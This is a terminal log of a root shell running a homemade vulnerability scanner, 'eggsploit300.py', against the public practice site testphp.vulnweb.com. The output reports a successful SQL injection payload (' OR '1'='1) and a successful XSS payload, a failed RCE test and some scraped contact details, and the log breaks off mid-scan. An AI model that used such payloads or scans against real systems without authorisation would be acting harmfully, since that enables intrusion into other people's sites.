└─# nano eggsploit300.py

┌──(myenv)(root㉿acf694de8093)-[/eggsploit30-0]
└─# nano eggsploit300.py

┌──(myenv)(root㉿acf694de8093)-[/eggsploit30-0]
└─# python3 eggsploit300.py

    ███████╗░██████╗░░██████╗░██╗░░░██╗██████╗░░█████╗░░█████╗░
    ██╔════╝██╔════╝░██╔════╝░╚██╗░██╔╝╚════██╗██╔══██╗██╔══██╗
    █████╗░░██║░░██╗░██║░░██╗░░╚████╔╝░░█████╔╝██║░░██║██║░░██║
    ██╔══╝░░██║░░╚██╗██║░░╚██╗░░╚██╔╝░░░╚═══██╗██║░░██║██║░░██║
    ███████╗╚██████╔╝╚██████╔╝░░░██║░░░██████╔╝╚█████╔╝╚█████╔╝
    ╚══════╝░╚═════╝░░╚═════╝░░░░╚═╝░░░╚═════╝░░╚════╝░░╚════╝░
    
                Made by ediop3Squad leader
    
Enter URL to scan: http://testphp.vulnweb.com
[*] Scanning http://testphp.vulnweb.com for vulnerabilities...

[+] Detected 1 forms on http://testphp.vulnweb.com
[+] Testing form for SQL Injection at http://testphp.vulnweb.com
[!] SQL Injection vulnerability detected with payload: ' OR '1'='1
[!] Vulnerable page: http://testphp.vulnweb.com/search.php?test=query

[!] Found Information:
Names: Privacy Policy, About Us, Acunetix Web, Vulnerability Scanner, Acunetix Ltd
Emails: wvs@acunetix.com
[+] SQL Injection vulnerability found on http://testphp.vulnweb.com

[+] Detected 1 forms on http://testphp.vulnweb.com
[+] Testing form for XSS at http://testphp.vulnweb.com
[!] XSS vulnerability detected with payload: <script>alert('XSS')</script>
[!] Vulnerable page: http://testphp.vulnweb.com/search.php?test=query

[!] Found Information:
Names: Privacy Policy, About Us, Acunetix Web, Vulnerability Scanner, Acunetix Ltd
Emails: wvs@acunetix.com
[+] XSS vulnerability found on http://testphp.vulnweb.com

[+] Detected 1 forms on http://testphp.vulnweb.com
[+] Testing form for Remote Code Execution at http://testphp.vulnweb.com
[-] No RCE vulnerabilities found on http://testphp.vulnweb.com

[+] Detected 1 forms on http://testphp.vulnweb.com
